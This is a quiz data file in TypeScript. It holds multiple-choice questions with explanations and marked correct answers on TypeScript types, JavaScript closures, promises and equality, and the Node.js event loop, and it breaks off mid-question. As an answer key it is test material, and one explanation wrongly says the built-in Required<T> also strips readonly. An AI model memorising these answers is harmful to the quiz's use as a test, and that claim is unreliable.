export type Answer = {
  answer: string;
  isCorrect: boolean;
};

export type Question = {
  question: string;
  explanation: string;
  answers: Answer[];
};

export type Quiz = {
  name: string;
  questions: Question[];
};

export const quizes: Quiz[] = [
  {
    name: "TypeScript",
    questions: [
      {
        question: `What does the following TypeScript conditional type evaluate to?

\`\`\`typescript
type Unpack<T> = T extends (...args: any[]) => infer R ? R : never;
type Result = Unpack<() => Promise<string>>;
\`\`\``,
        explanation: `The \`infer\` keyword inside a conditional type's \`extends\` clause lets TypeScript capture and name a type that it infers at evaluation time. Here, \`infer R\` captures whatever the function returns. Because \`() => Promise<string>\` returns \`Promise<string>\`, TypeScript binds \`R = Promise<string>\` and the whole type resolves to \`Promise<string>\`.

It does **not** unwrap the Promise — that would require composing with \`Awaited<T>\`. The \`never\` branch is only reached when \`T\` is not a function type at all. This pattern is exactly how TypeScript's built-in \`ReturnType<T>\` utility is implemented in \`lib.es5.d.ts\`.`,
        answers: [
          { answer: "`Promise<string>`", isCorrect: true },
          { answer: "`string`", isCorrect: false },
          { answer: "`never`", isCorrect: false },
          { answer: "`any`", isCorrect: false },
        ],
      },
      {
        question: `What does the \`-readonly\` modifier do in the following TypeScript mapped type, and what is the equivalent built-in utility type?

\`\`\`typescript
type User = {
  readonly id: number;
  readonly name: string;
  readonly email: string;
};

type Mutable<T> = {
  -readonly [K in keyof T]: T[K];
};

type MutableUser = Mutable<User>;
\`\`\``,
        explanation: `In TypeScript mapped types, the \`+\` and \`-\` prefixes are **modifier operators** that add or remove property modifiers. \`-readonly\` removes the \`readonly\` modifier from every property, producing a fully mutable version of the type. The resulting \`MutableUser\` is equivalent to writing \`{ id: number; name: string; email: string; }\` by hand.

Similarly, \`-?\` removes the optional (\`?\`) marker — this is exactly how TypeScript's built-in \`Required<T>\` utility is implemented in \`lib.es5.d.ts\`:
\`\`\`typescript
type Required<T> = { -readonly [K in keyof T]-?: T[K]; };
\`\`\`

The \`+\` prefix is optional: \`+readonly\` and \`readonly\` are identical. TypeScript's built-in \`Readonly<T>\` adds the modifier, and \`Partial<T>\` adds \`?\`. There is no built-in \`Mutable<T>\` — it's a common custom utility you'll often see in codebases that need to temporarily work with immutable types.`,
        answers: [
          {
            answer: "It removes the `readonly` modifier from each property, making them all writable. There is no built-in equivalent — `Mutable<T>` is a common custom utility.",
            isCorrect: true,
          },
          {
            answer: "It makes every property both `readonly` and optional. The built-in equivalent is `Partial<Readonly<T>>`.",
            isCorrect: false,
          },
          {
            answer: "It is a syntax error — TypeScript mapped types do not support modifier removal; you must retype each property manually.",
            isCorrect: false,
          },
          {
            answer: "It marks every property as deprecated. The `-` prefix is an alias for the `@deprecated` JSDoc annotation in mapped types.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `The following TypeScript function uses an exhaustiveness check. A new \`"triangle"\` variant is added to the \`Shape\` union but \`area\` is not updated. What happens, and what is the role of the \`never\` type here?

\`\`\`typescript
type Shape =
  | { kind: "circle"; radius: number }
  | { kind: "square"; side: number };

function area(shape: Shape): number {
  switch (shape.kind) {
    case "circle": return Math.PI * shape.radius ** 2;
    case "square": return shape.side ** 2;
    default: {
      const _exhaustive: never = shape;
      return _exhaustive;
    }
  }
}
\`\`\``,
        explanation: `This is the **exhaustiveness checking** pattern built on the fact that \`never\` is the empty type — no value is assignable to \`never\` except a value of type \`never\` itself.

Inside the \`default\` branch, TypeScript has narrowed \`shape\` by eliminating every handled \`kind\`. As long as all variants are handled, the narrowed type is \`never\`, and \`const _exhaustive: never = shape\` type-checks.

The moment you add \`{ kind: "triangle"; base: number; height: number }\` to \`Shape\` without adding a \`case\`, the \`default\` branch narrows \`shape\` to that triangle member instead of \`never\`. Assigning it to a \`never\`-typed variable produces a **compile-time error**: \`Type '{ kind: "triangle"; ... }' is not assignable to type 'never'\`. This turns a forgotten case into a build failure rather than a silent runtime bug.

Note this is a *compile-time* guarantee only — it requires strict type checking and provides no protection if \`shape\` arrives as untyped data at runtime (e.g., from JSON). For that you still need runtime validation.`,
        answers: [
          {
            answer: "TypeScript raises a compile-time error at the `never` assignment because the un-handled `triangle` variant is no longer narrowable to `never`, catching the missing case at build time.",
            isCorrect: true,
          },
          {
            answer: "Nothing changes at compile time; the `default` branch silently returns `undefined` at runtime for triangles.",
            isCorrect: false,
          },
          {
            answer: "TypeScript throws a runtime `TypeError` whenever a triangle is passed, because `never` values cannot be constructed.",
            isCorrect: false,
          },
          {
            answer: "The code fails to compile immediately even before adding `triangle`, because assigning any value to `never` is always illegal.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `What does \`A\` resolve to in the following code, and why?

\`\`\`typescript
type ToArray<T> = T extends unknown ? T[] : never;
type A = ToArray<string | number>;
\`\`\``,
        explanation: `When a conditional type checks a **naked type parameter** (\`T extends ...\` where \`T\` is not wrapped in anything), TypeScript makes it **distributive**: if \`T\` is instantiated with a union, the conditional is applied to each member separately and the results are unioned back together.

So \`ToArray<string | number>\` becomes \`ToArray<string> | ToArray<number>\`, which is \`string[] | number[]\` — an array that is *either* all strings *or* all numbers.

If you want the non-distributive behavior (\`(string | number)[]\`, a mixed array), wrap both sides of the check in a tuple so \`T\` is no longer naked:

\`\`\`typescript
type ToArrayND<T> = [T] extends [unknown] ? T[] : never;
type B = ToArrayND<string | number>; // (string | number)[]
\`\`\`

Distribution is what makes built-ins like \`Exclude<T, U>\` and \`NonNullable<T>\` work.`,
        answers: [
          {
            answer: `\`string[] | number[]\` — conditional types distribute over unions when the checked type is a naked type parameter, so each member is mapped separately.`,
            isCorrect: true,
          },
          {
            answer: `\`(string | number)[]\` — the union is treated as a single type and wrapped in one array.`,
            isCorrect: false,
          },
          {
            answer: `\`never\` — a union cannot extend \`unknown\` as a whole, so the false branch is taken.`,
            isCorrect: false,
          },
          {
            answer: `\`unknown[]\` — the conditional widens the union to its common supertype before applying \`T[]\`.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `Given the code below, which of the two marked lines produce a compile-time error?

\`\`\`typescript
type Config = Record<string, string | number>;

const a: Config = { port: 3000, host: "localhost" };
const b = { port: 3000, host: "localhost" } satisfies Config;

a.port.toFixed(0); // Line 1
b.port.toFixed(0); // Line 2
\`\`\``,
        explanation: `A **type annotation** (\`const a: Config\`) *replaces* the inferred type of the expression with the annotated type. After the annotation, TypeScript only knows that \`a.port\` is \`string | number\`, and \`toFixed\` does not exist on \`string\`, so **Line 1 errors**.

The **\`satisfies\`** operator (TypeScript 4.9+) *validates* that the expression is assignable to \`Config\` — you still get errors for typos or wrong value types — but it **keeps the more specific inferred type** of the expression. \`b\` is still typed as \`{ port: number; host: string }\`, so \`b.port.toFixed(0)\` compiles fine.

\`satisfies\` is ideal for config objects, route tables, and lookup maps where you want both conformance checking and precise inference (including literal types when combined with \`as const\`).`,
        answers: [
          {
            answer: `Only Line 1. The annotation widens \`a.port\` to \`string | number\`, while \`satisfies\` checks conformance but preserves the inferred type, so \`b.port\` is still \`number\`.`,
            isCorrect: true,
          },
          {
            answer: `Only Line 2. \`satisfies\` widens the value to the target type, while the annotation keeps the narrow inferred type.`,
            isCorrect: false,
          },
          {
            answer: `Both lines error, because both \`a\` and \`b\` are typed as \`Record<string, string | number>\`.`,
            isCorrect: false,
          },
          {
            answer: `Neither line errors; TypeScript narrows \`a.port\` to \`number\` from the object literal initializer despite the annotation.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `What happens when the following code is compiled with \`strict: true\`?

\`\`\`typescript
function getUserName(json: string) {
  const data: unknown = JSON.parse(json);
  return data.user.name;
}
\`\`\``,
        explanation: `\`unknown\` is the **type-safe counterpart of \`any\`**. Any value can be assigned to an \`unknown\` variable, but you can't do *anything* with an \`unknown\` value — access properties, call it, or pass it where a specific type is expected — until you've **narrowed** it. So \`data.user\` produces error **TS18046: 'data' is of type 'unknown'**.

Even though \`JSON.parse\` returns \`any\`, the explicit \`: unknown\` annotation wins: assigning \`any\` to an \`unknown\` variable is allowed, and from then on the variable is \`unknown\`.

Ways to narrow:
- \`typeof\`/\`in\`/\`instanceof\` checks
- A user-defined type guard (\`function isUser(x: unknown): x is User\`)
- A runtime schema validator like Zod (\`UserSchema.parse(data)\`), which is the most robust option for untrusted input such as API payloads

This is why many teams prefer \`unknown\` for anything crossing a trust boundary.`,
        answers: [
          {
            answer: `It fails to compile: values of type \`unknown\` can't have properties accessed until they are narrowed (e.g. with a type guard or a schema validator like Zod).`,
            isCorrect: true,
          },
          {
            answer: `It compiles and the function's return type is inferred as \`any\`, because \`JSON.parse\` returns \`any\` and that overrides the annotation.`,
            isCorrect: false,
          },
          {
            answer: `It compiles, but throws at runtime if \`user\` is missing, since \`unknown\` only affects runtime checks.`,
            isCorrect: false,
          },
          {
            answer: `It compiles, because \`strict\` mode treats \`unknown\` the same as \`{}\` and allows property access with optional chaining inserted automatically.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `Which of the marked assignments produce a compile-time error?

\`\`\`typescript
interface Point { x: number; y: number }

const p1: Point = { x: 1, y: 2, z: 3 };   // A

const tmp = { x: 1, y: 2, z: 3 };
const p2: Point = tmp;                    // B
\`\`\``,
        explanation: `TypeScript is **structurally typed**: a value is assignable to \`Point\` if it has *at least* the required properties with compatible types. Extra properties are normally fine, which is why **B compiles** — \`tmp\` has \`x\` and \`y\`, and \`z\` is simply ignored by the \`Point\` type.

However, TypeScript applies an extra rule called **excess property checking** to *fresh object literals* — object literals written directly at the point of assignment or as a function argument. Because an extra property on a literal is almost always a typo (e.g. \`colour\` instead of \`color\`), **A errors**: *"Object literal may only specify known properties, and 'z' does not exist in type 'Point'."*

Once the literal is stored in a variable it loses its "freshness", and only the normal structural compatibility check applies. This is a common source of confusion when refactoring inline literals into variables.`,
        answers: [
          {
            answer: `Only A. Excess property checks apply only to "fresh" object literals; once the literal is assigned to a variable first, normal structural typing allows the extra \`z\`.`,
            isCorrect: true,
          },
          {
            answer: `Both A and B, because \`Point\` is an interface and interfaces are closed — no extra properties are ever allowed.`,
            isCorrect: false,
          },
          {
            answer: `Only B, because \`tmp\` is inferred as \`{ x: number; y: number; z: number }\` which is a different nominal type than \`Point\`.`,
            isCorrect: false,
          },
          {
            answer: `Neither — TypeScript's structural typing always ignores extra properties.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `What is the resulting type \`H\`?

\`\`\`typescript
type Handlers<T extends string> = {
  [K in T as \`on\${Capitalize<K>}\`]: () => void;
};

type H = Handlers<"click" | "focus">;
\`\`\``,
        explanation: `This combines two TypeScript 4.1+ features:

1. **Template literal types** — \`\` \`on\${Capitalize<K>}\` \`\` builds a new string literal type from \`K\`. \`Capitalize\` is one of the intrinsic string manipulation types (along with \`Uppercase\`, \`Lowercase\`, \`Uncapitalize\`).
2. **Key remapping in mapped types** — the \`as\` clause lets a mapped type rename each key as it iterates.

Iterating \`K\` over \`"click" | "focus"\` produces the keys \`"onClick"\` and \`"onFocus"\`, so:

\`\`\`typescript
type H = { onClick: () => void; onFocus: () => void };
\`\`\`

The \`as\` clause can also *filter* keys: if it resolves to \`never\`, the key is dropped (e.g. \`\` as K extends \`_\${string}\` ? never : K \`\` to strip "private" underscore keys).`,
        answers: [
          {
            answer: `\`{ onClick: () => void; onFocus: () => void }\``,
            isCorrect: true,
          },
          {
            answer: `\`{ click: () => void; focus: () => void }\` — the \`as\` clause only affects the value type, not the key.`,
            isCorrect: false,
          },
          {
            answer: `\`{ onclick: () => void; onfocus: () => void }\` — template literal types can't change letter case.`,
            isCorrect: false,
          },
          {
            answer: `A compile error — \`as\` is not allowed inside a mapped type's key clause.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `What happens when TypeScript compiles the following declarations in the same module?

\`\`\`typescript
interface User { id: string }
interface User { email: string }

type Account = { id: string };
type Account = { email: string };
\`\`\``,
        explanation: `**Interfaces are open** and support **declaration merging**: multiple \`interface\` declarations with the same name in the same scope are merged into a single type. Here \`User\` becomes \`{ id: string; email: string }\`.

**Type aliases are closed**: a \`type\` name can only be declared once, so the second \`type Account\` is an error — *"Duplicate identifier 'Account'."*

Declaration merging is what powers **module augmentation**, e.g. adding a \`user\` property to Express's \`Request\`:

\`\`\`typescript
declare global {
  namespace Express {
    interface Request { user?: AuthUser }
  }
}
\`\`\`

It's also a reason some teams prefer \`type\` for application code: it prevents accidental merging with a same-named interface from elsewhere in the program.`,
        answers: [
          {
            answer: `The two \`User\` interfaces merge into \`{ id: string; email: string }\`, but the second \`type Account\` is a "Duplicate identifier" error — type aliases can't be merged.`,
            isCorrect: true,
          },
          {
            answer: `Both compile: \`User\` and \`Account\` each become \`{ id: string; email: string }\`.`,
            isCorrect: false,
          },
          {
            answer: `Both are errors, because no TypeScript declaration may share a name with another in the same scope.`,
            isCorrect: false,
          },
          {
            answer: `Both compile, but the later declaration wins, so \`User\` is \`{ email: string }\` and \`Account\` is \`{ email: string }\`.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `What is the type \`Role\` in the following code, and what would it be **without** \`as const\`?

\`\`\`typescript
const ROLES = ["admin", "editor", "viewer"] as const;
type Role = (typeof ROLES)[number];
\`\`\``,
        explanation: `A **const assertion** (\`as const\`) tells TypeScript to infer the narrowest possible type for a literal:
- string/number literals keep their literal types (\`"admin"\` instead of \`string\`)
- arrays become \`readonly\` tuples
- object properties become \`readonly\`

So \`ROLES\` is \`readonly ["admin", "editor", "viewer"]\`. Indexing a tuple type with \`number\` yields the union of its element types: \`Role = "admin" | "editor" | "viewer"\`.

Without \`as const\`, \`ROLES\` is inferred as a mutable \`string[]\` (since the array could later have any string pushed into it), and \`Role\` would just be \`string\`.

This pattern gives you a single source of truth: a runtime array you can iterate over (e.g. to render a dropdown or validate input) *and* a derived union type, with no duplication.`,
        answers: [
          {
            answer: `\`"admin" | "editor" | "viewer"\`. Without \`as const\` the array is inferred as \`string[]\`, so \`Role\` would be just \`string\`.`,
            isCorrect: true,
          },
          {
            answer: `\`readonly string[]\` in both cases — \`as const\` only affects mutability, not element types.`,
            isCorrect: false,
          },
          {
            answer: `\`"admin"\` — indexing with \`number\` returns only the first element's type.`,
            isCorrect: false,
          },
          {
            answer: `\`"admin" | "editor" | "viewer"\` in both cases, because TypeScript always infers literal types for \`const\` declarations.`,
            isCorrect: false,
          },
        ],
      },
    ],
  },
  {
    name: "JavaScript",
    questions: [
      {
        question: `What is the output of the following JavaScript code?

\`\`\`javascript
function makeCounter(initial = 0) {
  let count = initial;
  return {
    increment() { return ++count; },
    decrement() { return --count; },
    value()     { return count; },
  };
}

const a = makeCounter(10);
const b = makeCounter(10);

a.increment();
a.increment();
b.decrement();

console.log(a.value(), b.value());
\`\`\``,
        explanation: `Each call to \`makeCounter\` creates a new **execution context** with its own \`count\` variable. The three returned methods form a **closure** over that specific \`count\` — they hold a live reference to the variable in the scope where they were created, not a copy of its value.

\`a\` and \`b\` are completely independent: each closes over a separate \`count\` initialized to \`10\`. Calling \`a.increment()\` twice raises \`a\`'s count to \`12\`. Calling \`b.decrement()\` once lowers \`b\`'s count to \`9\`. Neither operation affects the other.

This pattern — using closures to encapsulate mutable private state — is the **Module Pattern**, one of the foundational JavaScript design patterns predating ES6 classes and still commonly used in functional codebases.`,
        answers: [
          { answer: "`12 9`", isCorrect: true },
          { answer: "`12 11`", isCorrect: false },
          { answer: "`11 9`", isCorrect: false },
          { answer: "`12 12`", isCorrect: false },
        ],
      },
      {
        question: `What does the following JavaScript code log, and why?

\`\`\`javascript
const user = {
  name: "Ada",
  greetLater() {
    setTimeout(function () {
      console.log("Hi, " + this.name);
    }, 0);
  },
  greetLaterArrow() {
    setTimeout(() => {
      console.log("Hi, " + this.name);
    }, 0);
  },
};

user.greetLater();
user.greetLaterArrow();
\`\`\``,
        explanation: `The output is:
\`\`\`
Hi, undefined
Hi, Ada
\`\`\`

**\`greetLater\`** passes a regular \`function\` to \`setTimeout\`. Regular functions get their \`this\` bound **at call time** based on *how* they are invoked. \`setTimeout\` invokes its callback as a plain function call with no receiver, so \`this\` is the global object (\`window\` in browsers, \`global\`/\`timers\` object in Node) in non-strict mode, or \`undefined\` in strict mode / ES modules. Either way \`this.name\` is not \`"Ada"\` — in a browser it logs \`Hi, undefined\`.

**\`greetLaterArrow\`** uses an **arrow function**, which has no \`this\` of its own. It lexically captures \`this\` from the enclosing scope — the \`greetLaterArrow\` method, where \`this\` is \`user\`. So \`this.name\` is \`"Ada"\`.

This is the single most important practical difference between arrow functions and regular functions: arrow functions capture \`this\` lexically and cannot be re-bound with \`call\`/\`apply\`/\`bind\`. It's exactly why arrow functions became the default for callbacks, event handlers, and array-method iteratees that need to reference enclosing state.`,
        answers: [
          {
            answer: "`Hi, undefined` then `Hi, Ada` — the regular function's `this` is rebound by `setTimeout` (not `user`), while the arrow function lexically captures `this` from the enclosing method.",
            isCorrect: true,
          },
          {
            answer: "`Hi, Ada` then `Hi, Ada` — both callbacks retain `this` from the object they were defined on.",
            isCorrect: false,
          },
          {
            answer: "`Hi, Ada` then `Hi, undefined` — regular functions capture `this` lexically while arrow functions get a fresh global `this`.",
            isCorrect: false,
          },
          {
            answer: "`Hi, undefined` then `Hi, undefined` — `setTimeout` always strips `this` for every callback type.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `In what order are the letters logged?

\`\`\`javascript
async function run() {
  console.log("a1");
  await null;
  console.log("a2");
}

console.log("s");
run();
Promise.resolve().then(() => console.log("p"));
console.log("e");
\`\`\``,
        explanation: `The body of an \`async\` function runs **synchronously** until it hits its first \`await\`. So the synchronous phase logs:

1. \`s\`
2. \`a1\` — \`run()\` starts executing immediately
3. \`e\` — after \`await null\` suspends \`run\`, control returns to the caller, the \`.then\` callback is registered, and \`e\` is logged

\`await null\` wraps \`null\` in a resolved promise and schedules the rest of \`run\` (the continuation) as a **microtask**. That happens *before* \`Promise.resolve().then(...)\` schedules its callback, so the microtask queue is \`[continuation of run, p-callback]\`.

Once the call stack empties, microtasks run in FIFO order: \`a2\`, then \`p\`.

Final output: \`s a1 e a2 p\`. Note that \`await\` always yields, even when awaiting a non-promise value.`,
        answers: [
          {
            answer: `\`s a1 e a2 p\``,
            isCorrect: true,
          },
          {
            answer: `\`s a1 a2 e p\` — awaiting a non-promise value like \`null\` doesn't yield, so \`run\` finishes synchronously.`,
            isCorrect: false,
          },
          {
            answer: `\`s e a1 a2 p\` — async functions are deferred entirely until the current script finishes.`,
            isCorrect: false,
          },
          {
            answer: `\`s a1 e p a2\` — \`.then\` callbacks always run before \`await\` continuations.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `What do these two loops log?

\`\`\`javascript
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log("var:", i), 0);
}

for (let j = 0; j < 3; j++) {
  setTimeout(() => console.log("let:", j), 0);
}
\`\`\``,
        explanation: `\`var\` is **function-scoped**: there is exactly one \`i\` binding shared by every iteration. The callbacks close over that single binding and only run after the loop finishes, when \`i\` is \`3\`. So the first loop logs \`var: 3\` three times.

\`let\` in a \`for\` loop header is special: the spec creates a **fresh binding for each iteration** (copying the previous value into it before the increment). Each arrow function closes over its own \`j\`, so the second loop logs \`let: 0\`, \`let: 1\`, \`let: 2\`.

Before ES2015, the usual workaround was an IIFE (\`(function (i) { ... })(i)\`) to create a new scope per iteration.`,
        answers: [
          {
            answer: `\`var: 3\` three times, then \`let: 0\`, \`let: 1\`, \`let: 2\` — \`var\` has one shared binding, while \`let\` creates a new binding per iteration.`,
            isCorrect: true,
          },
          {
            answer: `\`var: 0, 1, 2\` and \`let: 0, 1, 2\` — closures capture the value at the moment they are created.`,
            isCorrect: false,
          },
          {
            answer: `\`var: 3\` three times and \`let: 3\` three times — \`setTimeout\` always runs after the loop, so both see the final value.`,
            isCorrect: false,
          },
          {
            answer: `\`var: 2\` three times and \`let: 0, 1, 2\` — \`var\` keeps the last value that passed the loop condition.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `What does this code log?

\`\`\`javascript
const arr = [NaN, 0];

console.log(arr.indexOf(NaN));
console.log(arr.includes(NaN));
console.log(arr.includes(-0));
console.log(Object.is(0, -0));
\`\`\``,
        explanation: `JavaScript has several equality algorithms:

| Algorithm | Used by | \`NaN\` equals \`NaN\`? | \`+0\` equals \`-0\`? |
|---|---|---|---|
| Strict Equality (\`===\`) | \`indexOf\`, \`lastIndexOf\` | No | Yes |
| SameValueZero | \`includes\`, \`Map\`/\`Set\` keys | Yes | Yes |
| SameValue | \`Object.is\` | Yes | No |

- \`indexOf(NaN)\` uses \`===\`, and \`NaN !== NaN\`, so it returns \`-1\`.
- \`includes(NaN)\` uses SameValueZero, which treats \`NaN\` as equal to itself → \`true\`.
- \`includes(-0)\` → SameValueZero treats \`+0\` and \`-0\` as equal → \`true\`.
- \`Object.is(0, -0)\` uses SameValue, which distinguishes the signed zeros → \`false\`.

This is why \`includes\` is preferred over \`indexOf(...) !== -1\` for membership tests.`,
        answers: [
          {
            answer: `\`-1\`, \`true\`, \`true\`, \`false\``,
            isCorrect: true,
          },
          {
            answer: `\`0\`, \`true\`, \`true\`, \`true\``,
            isCorrect: false,
          },
          {
            answer: `\`-1\`, \`false\`, \`true\`, \`false\``,
            isCorrect: false,
          },
          {
            answer: `\`-1\`, \`true\`, \`false\`, \`false\``,
            isCorrect: false,
          },
        ],
      },
      {
        question: `What does the final line log, and what is the main trade-off of declaring \`handleClick\` this way?

\`\`\`javascript
class Button {
  label = "OK";
  handleClick = () => console.log(this.label);
  render() { return this.label; }
}

const a = new Button();
const b = new Button();
console.log(a.handleClick === b.handleClick, a.render === b.render);
\`\`\``,
        explanation: `**Class methods** like \`render()\` are defined once on \`Button.prototype\` and shared by every instance, so \`a.render === b.render\` is \`true\`.

**Class fields** (\`handleClick = ...\`) are initialized in the constructor for *each* instance. Every \`new Button()\` creates a new arrow function stored as an **own property**, so \`a.handleClick === b.handleClick\` is \`false\`.

The upside of the arrow-function field is that \`this\` is lexically bound to the instance, so it's safe to pass as a callback (\`onClick={this.handleClick}\`) without \`.bind\`.

The trade-offs:
- One function allocation per instance (matters for many instances)
- It's not on the prototype, so a subclass can't call \`super.handleClick()\`, and mocking via \`Button.prototype.handleClick\` in tests doesn't work
- A subclass *method* named \`handleClick\` is shadowed by the parent's own-property field`,
        answers: [
          {
            answer: `\`false true\` — the arrow-function field is created per instance as an own property (auto-bound \`this\`, but extra allocations and no \`super\`/prototype access), while \`render\` is shared on the prototype.`,
            isCorrect: true,
          },
          {
            answer: `\`true true\` — both are stored once on \`Button.prototype\`; the arrow only changes how \`this\` is bound.`,
            isCorrect: false,
          },
          {
            answer: `\`true false\` — fields are hoisted to the prototype, while methods are copied to every instance.`,
            isCorrect: false,
          },
          {
            answer: `\`false false\` — every class member is copied onto each instance at construction time.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `What does this code log, and when?

\`\`\`javascript
const slow = new Promise((resolve) =>
  setTimeout(() => { console.log("slow done"); resolve("S"); }, 1000)
);
const fail = Promise.reject(new Error("boom"));

Promise.all([slow, fail])
  .then((values) => console.log("values", values))
  .catch((err) => console.log("caught", err.message));
\`\`\``,
        explanation: `\`Promise.all\` **rejects as soon as any input rejects** ("fail-fast"). Because \`fail\` is already rejected, \`caught boom\` is logged almost immediately (on the next microtask turns).

However, **promises are not cancellable**: \`Promise.all\` rejecting doesn't stop the work behind \`slow\`. Its timer still fires after one second and logs \`slow done\`. Its result is simply ignored.

Related combinators:
- \`Promise.allSettled\` — waits for all and reports each \`{ status, value | reason }\`; never rejects
- \`Promise.any\` — resolves with the first *fulfillment*; rejects with an \`AggregateError\` only if all reject
- \`Promise.race\` — settles like the first input to settle, either way

To actually cancel in-flight work (e.g. \`fetch\`), pass an \`AbortSignal\` and abort it on failure.`,
        answers: [
          {
            answer: `\`caught boom\` immediately, then \`slow done\` about one second later — \`Promise.all\` fails fast but does not cancel the other promises.`,
            isCorrect: true,
          },
          {
            answer: `\`slow done\` after one second, then \`caught boom\` — \`Promise.all\` waits for every promise to settle before rejecting.`,
            isCorrect: false,
          },
          {
            answer: `Only \`caught boom\` — when \`Promise.all\` rejects, the remaining pending promises are cancelled.`,
            isCorrect: false,
          },
          {
            answer: `\`slow done\`, then \`values ["S", undefined]\` — rejected promises are converted to \`undefined\` in the result array.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `What does this code log, and what is the most robust built-in way to get an independent copy of \`original\`?

\`\`\`javascript
const original = {
  name: "cfg",
  limits: { max: 10 },
  created: new Date(0),
};

const copy = { ...original };
copy.name = "copy";
copy.limits.max = 99;

console.log(original.name, original.limits.max);
\`\`\``,
        explanation: `Object spread (like \`Object.assign\`) makes a **shallow copy**: it copies the top-level properties into a new object. Primitives (\`name\`) are copied by value, so changing \`copy.name\` doesn't affect \`original\`. But \`limits\` is an object, so only the **reference** is copied — \`copy.limits\` and \`original.limits\` are the same object. The output is \`cfg 99\`.

For a deep copy, use **\`structuredClone\`** (available in modern browsers and Node 17+). It handles nested objects, \`Date\`, \`Map\`, \`Set\`, typed arrays, and even circular references.

Its limits: it throws on functions and DOM nodes, and it does not preserve class prototypes (class instances come back as plain objects).

\`JSON.parse(JSON.stringify(x))\` is a poor substitute: it turns \`Date\` into a string, drops \`undefined\` and functions, loses \`Map\`/\`Set\`, and throws on cycles.`,
        answers: [
          {
            answer: `\`cfg 99\`. Spread is a shallow copy, so \`limits\` is shared. \`structuredClone(original)\` makes a deep copy that also preserves \`Date\`, \`Map\`, \`Set\`, and cycles.`,
            isCorrect: true,
          },
          {
            answer: `\`cfg 10\`. Spread deep-copies plain objects; only class instances are shared by reference.`,
            isCorrect: false,
          },
          {
            answer: `\`copy 99\`. Spread creates an alias of the original object rather than a new object.`,
            isCorrect: false,
          },
          {
            answer: `\`cfg 99\`. The most robust fix is \`JSON.parse(JSON.stringify(original))\`, which preserves all types including \`Date\`.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `What happens when this script runs?

\`\`\`javascript
console.log(typeof foo);
console.log(typeof bar);

var foo = 1;
let bar = 2;
\`\`\``,
        explanation: `Both \`var\` and \`let\` declarations are **hoisted**, but differently:

- \`var foo\` is hoisted *and initialized to \`undefined\`* at the top of its scope. So \`typeof foo\` is \`"undefined"\`.
- \`let bar\` (and \`const\`, and \`class\`) is hoisted but **not initialized**. From the start of the scope until the declaration is evaluated, \`bar\` is in the **Temporal Dead Zone (TDZ)**. *Any* access, even \`typeof\`, throws \`ReferenceError: Cannot access 'bar' before initialization\`.

This is a notable exception to the usual safety of \`typeof\`, which returns \`"undefined"\` for a completely *undeclared* identifier without throwing. The TDZ exists to catch use-before-initialization bugs that \`var\` silently allows.`,
        answers: [
          {
            answer: `It logs \`"undefined"\`, then throws \`ReferenceError\` — \`bar\` is in the Temporal Dead Zone, and even \`typeof\` can't read it before the \`let\` declaration runs.`,
            isCorrect: true,
          },
          {
            answer: `It logs \`"undefined"\` twice — \`typeof\` never throws, even for variables that aren't initialized yet.`,
            isCorrect: false,
          },
          {
            answer: `It logs \`"number"\` twice — all declarations, including their values, are hoisted to the top.`,
            isCorrect: false,
          },
          {
            answer: `It throws \`ReferenceError\` on the first line, because \`foo\` is used before it's declared.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `You want to attach computed metadata to DOM nodes (or other objects you don't own) without leaking memory after those objects are removed and no longer referenced elsewhere. Which approach is correct?`,
        explanation: `A **\`WeakMap\`** holds its keys **weakly**: if the only remaining reference to a key object is the \`WeakMap\` entry itself, the key can be garbage-collected, and its entry (and value) disappears with it.

\`\`\`javascript
const meta = new WeakMap();
function getMeta(node) {
  if (!meta.has(node)) meta.set(node, computeExpensiveMeta(node));
  return meta.get(node);
}
\`\`\`

With a regular \`Map\`, the map itself keeps every key strongly reachable, so removed DOM nodes (and everything they reference) can never be collected unless you remember to \`delete\` them — a classic leak.

Because collection timing is non-deterministic, \`WeakMap\` is **not iterable** and has no \`size\` or \`clear()\`. Keys must be objects (or non-registered symbols), not primitives. Values are held strongly but only as long as their key is alive.`,
        answers: [
          {
            answer: `Use a \`WeakMap\` keyed by the object. Keys are held weakly, so when the object is otherwise unreachable, its entry can be garbage-collected. The trade-off is that a \`WeakMap\` can't be iterated or sized.`,
            isCorrect: true,
          },
          {
            answer: `Use a \`Map\` keyed by the object. Modern engines automatically remove \`Map\` entries whose keys are only referenced by the map.`,
            isCorrect: false,
          },
          {
            answer: `Use a \`WeakSet\` of \`[node, metadata]\` pairs, because \`WeakSet\` holds both keys and values weakly.`,
            isCorrect: false,
          },
          {
            answer: `Use a \`WeakMap\` keyed by a string ID of the node. \`WeakMap\` accepts primitive keys and drops them when the string is no longer used.`,
            isCorrect: false,
          },
        ],
      },
    ],
  },
  {
    name: "Node.js",
    questions: [
      {
        question: `Consider the following Node.js script:

\`\`\`javascript
setTimeout(() => console.log('setTimeout'), 0);
setImmediate(() => console.log('setImmediate'));
Promise.resolve().then(() => console.log('Promise'));
process.nextTick(() => console.log('nextTick'));
\`\`\`

Ignoring the non-deterministic ordering between \`setTimeout\` and \`setImmediate\`, which two callbacks are **always** guaranteed to run before \`setImmediate\`?`,
        explanation: `Node.js processes two special queues before advancing to the next event loop phase:

1. **Next tick queue** (\`process.nextTick\`): drained completely before anything else — even before Promise microtasks.
2. **Microtask queue** (resolved Promises / \`queueMicrotask\`): drained after the next tick queue is empty.

Only after both queues are empty does Node.js move to the next event loop phase. \`setImmediate\` runs in the **check phase** — after I/O polling — making it the last of the group to execute.

The relative order of \`setTimeout(fn, 0)\` vs \`setImmediate\` is non-deterministic when both are queued from the main module, because which phase runs first depends on OS scheduling jitter. Inside an I/O callback, \`setImmediate\` is guaranteed to fire before \`setTimeout(fn, 0)\`.`,
        answers: [
          {
            answer: "`process.nextTick` and resolved Promise callbacks",
            isCorrect: true,
          },
          {
